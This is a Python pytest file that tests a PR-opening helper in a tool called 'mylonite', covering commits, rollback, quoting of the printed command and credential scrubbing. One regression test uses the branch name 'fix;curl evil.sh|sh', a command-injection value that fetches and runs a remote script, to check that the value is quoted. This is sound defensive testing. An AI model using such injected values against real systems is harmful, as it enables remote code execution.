import shlex
from pathlib import Path

import pytest

from mylonite.gate.pr import GatePaths, GatePrError, PrResult, open_or_print_pr


def _make_artifacts(tmp_path: Path) -> GatePaths:
    gate_dir = tmp_path / ".mylonite" / "gate"
    gate_dir.mkdir(parents=True)
    (gate_dir / "test_security_x.py").write_text("# test\n", encoding="utf-8")
    (gate_dir / "exploit_x.json").write_text("{}", encoding="utf-8")
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "mylonite-gate.yml").write_text("name: gate\n", encoding="utf-8")
    return GatePaths(
        repo_root=tmp_path, gate_dir=gate_dir, workflow_files=[wf / "mylonite-gate.yml"]
    )


def _fake_runner_recording():
    calls = []

    def run(cmd, **kwargs):
        calls.append(list(cmd))

        class _CP:  # completed-process-ish
            returncode = 0
            stdout = ""
            stderr = ""

        return _CP()

    run.calls = calls  # type: ignore[attr-defined]
    return run


def test_print_path_when_open_pr_false(tmp_path, capsys):
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()
    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        _run=runner,
    )
    assert isinstance(result, PrResult)
    assert result.opened is False
    out = capsys.readouterr().out
    assert "mylonite/gate-x" in out
    assert "gh pr create" in out  # prints the exact command to run by hand
    assert result.printed_command is not None
    assert not any(c[:2] == ["git", "push"] for c in runner.calls)
    assert not any(c[:1] == ["gh"] for c in runner.calls)


def test_no_git_mutation_at_all_without_open_pr(tmp_path, capsys):
    """Without --open-pr, `gate` must not touch the operator's repository.

    The commit sequence used to run BEFORE the `if not open_pr` check, so a user
    running plain `mylonite gate` to see what it finds got a new branch and a
    commit they never asked for. Committing is part of the PR flow; it is gated
    on the flag that requests the PR flow.
    """
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()

    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        _run=runner,
    )

    assert result.opened is False
    # NOTHING ran. Not rev-parse, not checkout, not add, not commit.
    assert runner.calls == [], f"expected zero git subprocesses; got {runner.calls}"
    # ...and the operator is told exactly how to do it by hand instead.
    printed = result.printed_command or ""
    assert "git checkout -b" in printed
    assert "git add" in printed
    assert "git commit" in printed
    assert "gh pr create" in printed


def test_open_pr_still_commits(tmp_path, monkeypatch):
    """The commit sequence still runs when the operator asks for the PR flow."""
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()

    open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        _run=runner,
    )

    assert ["git", "checkout", "-b", "mylonite/gate-x"] in runner.calls
    assert any(c[:2] == ["git", "add"] for c in runner.calls)
    assert ["git", "commit", "-m", "Gate: x"] in runner.calls


def test_open_path_calls_gh_when_available(tmp_path, monkeypatch):
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    cmds = []

    def run(cmd, **kwargs):
        cmds.append(list(cmd))

        class _CP:
            returncode = 0
            # gh auth status -> ok; gh pr create -> prints URL
            stdout = "https://github.com/o/r/pull/1\n" if cmd[:3] == ["gh", "pr", "create"] else ""
            stderr = ""

        return _CP()

    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        _run=run,
    )
    assert result.opened is True
    assert result.pr_url == "https://github.com/o/r/pull/1"
    assert ["git", "push", "-u", "origin", "mylonite/gate-x"] in cmds
    assert any(c[:3] == ["gh", "pr", "create"] for c in cmds)


def test_open_requested_but_gh_missing_degrades_to_print(tmp_path, capsys, monkeypatch):
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: None)  # gh not installed
    paths = _make_artifacts(tmp_path)
    result = open_or_print_pr(
        paths,
        branch="mylonite/gate-x",
        pr_title="Gate: x",
        pr_body="body",
        open_pr=True,
        _run=_fake_runner_recording(),
    )
    assert result.opened is False
    assert "gh pr create" in capsys.readouterr().out


def test_relative_gate_dir_does_not_crash(tmp_path, monkeypatch):
    """A RELATIVE gate_dir (the CLI default '--out .mylonite/gate') must not raise ValueError.

    Before the fix, Path(".mylonite/gate").relative_to(tmp_path) raised ValueError because
    you cannot call relative_to() on a relative path against an absolute one.
    """
    import mylonite.gate.pr as prmod

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(prmod.shutil, "which", lambda _: None)  # stop after the commit
    gate_dir = tmp_path / ".mylonite" / "gate"
    gate_dir.mkdir(parents=True)
    (gate_dir / "test_security_x.py").write_text("# t\n", encoding="utf-8")

    from pathlib import Path as _P

    # gate_dir is deliberately RELATIVE — mirrors the real CLI default
    paths = GatePaths(repo_root=tmp_path, gate_dir=_P(".mylonite/gate"), workflow_files=[])
    runner = _fake_runner_recording()
    result = open_or_print_pr(
        paths,
        branch="b",
        pr_title="t",
        pr_body="x",
        open_pr=True,  # the commit sequence only runs under the PR flow
        _run=runner,
    )
    assert result.opened is False
    # The relative path must have reached git add without crashing
    git_add_calls = [c for c in runner.calls if c[:2] == ["git", "add"]]
    assert git_add_calls, "expected at least one git add call"
    added_args = " ".join(str(a) for a in git_add_calls[0])
    assert ".mylonite" in added_args, f"expected .mylonite in git add args; got: {git_add_calls[0]}"


def test_failing_git_commit_raises(tmp_path):
    paths = _make_artifacts(tmp_path)

    def run(cmd, **kwargs):
        class _CP:
            returncode = 1 if cmd[:2] == ["git", "commit"] else 0
            stdout = ""
            stderr = "nothing to commit"

        return _CP()

    with pytest.raises(GatePrError):
        open_or_print_pr(paths, branch="b", pr_title="t", pr_body="x", open_pr=True, _run=run)


def test_printed_command_quotes_every_interpolated_value(tmp_path):
    """DCR-0018: only pr_title was shlex.quote()d, so a branch named
    `fix;curl evil.sh|sh` — a valid git ref — executed when the operator
    copy-pasted the printed command, per the documented workflow.
    """
    paths = _make_artifacts(tmp_path)
    runner = _fake_runner_recording()
    branch = "fix;curl evil.sh|sh"

    result = open_or_print_pr(
        paths,
        branch=branch,
        pr_title="Gate: x",
        pr_body="body",
        open_pr=False,
        _run=runner,
    )

    assert result.printed_command is not None
    # the OLD, unquoted interpolation site must be gone...
    assert f"--head {branch}" not in result.printed_command
    # ...replaced by the branch as a single, safely-quoted shell token, so a
    # copy-pasted `curl` never becomes its own command.
    assert f"--head {shlex.quote(branch)}" in result.printed_command
    assert shlex.quote(branch) in result.printed_command


def test_failed_commit_restores_the_original_branch(tmp_path):
    """DCR-0017: a failure after `checkout -b` left the repo on a half-created
    branch, and the deterministic branch name blocked every retry.
    """
    paths = _make_artifacts(tmp_path)
    calls = []

    def run(cmd, **kwargs):
        calls.append(list(cmd))

        class _CP:
            returncode = 1 if cmd[:2] == ["git", "commit"] else 0
            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
            stderr = "nothing to commit" if cmd[:2] == ["git", "commit"] else ""

        return _CP()

    with pytest.raises(GatePrError):
        open_or_print_pr(
            paths,
            branch="mylonite/gate-fail",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            _run=run,
        )

    # the repo must end up back on the branch it started on...
    assert ["git", "checkout", "main"] in calls
    # ...and the half-created branch must be deleted so a retry with the same
    # deterministic branch name doesn't immediately fail on "branch exists".
    assert ["git", "branch", "-D", "mylonite/gate-fail"] in calls
    # rollback must happen AFTER the failing commit attempt, not before
    commit_idx = calls.index(["git", "commit", "-m", "t"])
    restore_idx = calls.index(["git", "checkout", "main"])
    assert restore_idx > commit_idx


def test_out_of_tree_gate_dir_raises_GatePrError_before_any_checkout(tmp_path):
    """DCR-0016: relative_to() raised a bare ValueError AFTER the branch switch."""
    repo_root = tmp_path / "repo"
    repo_root.mkdir()
    outside_dir = tmp_path / "outside" / "gate"
    outside_dir.mkdir(parents=True)
    (outside_dir / "test_security_x.py").write_text("# t\n", encoding="utf-8")
    paths = GatePaths(repo_root=repo_root, gate_dir=outside_dir, workflow_files=[])
    runner = _fake_runner_recording()

    with pytest.raises(GatePrError):
        open_or_print_pr(
            paths,
            branch="b",
            pr_title="t",
            pr_body="x",
            open_pr=False,
            _run=runner,
        )

    # nothing destructive (or otherwise) ran — the bad path is caught before
    # any git subprocess, let alone `checkout -b`.
    assert runner.calls == []


def test_git_stderr_credentials_are_scrubbed(tmp_path, monkeypatch):
    """DCR-0019: a credentialed remote URL in git's stderr was embedded verbatim."""
    import mylonite.gate.pr as prmod

    monkeypatch.setattr(prmod.shutil, "which", lambda _: "/usr/bin/gh")
    paths = _make_artifacts(tmp_path)
    credential = "hunter2verylongtoken1234"

    def run(cmd, **kwargs):
        class _CP:
            returncode = 1 if cmd[:2] == ["git", "push"] else 0
            stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
            stderr = (
                f"fatal: unable to access "
                f"'https://octocat:{credential}@github.com/o/r.git/': "
                f"The requested URL returned error: 403"
                if cmd[:2] == ["git", "push"]
                else ""
            )

        return _CP()

    with pytest.raises(GatePrError) as excinfo:
        open_or_print_pr(
            paths,
            branch="mylonite/gate-x",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            _run=run,
        )

    message = str(excinfo.value)
    assert credential not in message
    assert "github.com" in message  # host stays legible


def test_rollback_step_failure_warns_but_does_not_replace_the_original_error(tmp_path, capsys):
    """A failed rollback (e.g. `git checkout` blocked by a dirty tree) must not be
    silently swallowed — it must warn, and it must never mask or replace the
    ORIGINAL GatePrError that triggered the rollback in the first place.
    """
    paths = _make_artifacts(tmp_path)

    def run(cmd, **kwargs):
        class _CP:
            if cmd[:2] == ["git", "commit"]:
                returncode = 1
                stdout = ""
                stderr = "nothing to commit"
            elif cmd[:2] == ["git", "checkout"] and cmd[2] == "main":
                # the rollback's checkout-back step itself fails
                returncode = 1
                stdout = ""
                stderr = "error: Your local changes would be overwritten by checkout"
            else:
                returncode = 0
                stdout = "main\n" if cmd[:3] == ["git", "rev-parse", "--abbrev-ref"] else ""
                stderr = ""

        return _CP()

    with pytest.raises(GatePrError) as excinfo:
        open_or_print_pr(
            paths,
            branch="mylonite/gate-fail",
            pr_title="t",
            pr_body="x",
            open_pr=True,
            _run=run,
        )

    # the ORIGINAL commit failure is still what's raised, not a rollback error
    assert "commit" in str(excinfo.value)
    assert "nothing to commit" in str(excinfo.value)

    # ...but the operator sees a warning that the repo may be half-rolled-back
    err = capsys.readouterr().err
    assert "rollback" in err.lower()
    assert "mylonite/gate-fail" in err
    assert "Your local changes would be overwritten" in err
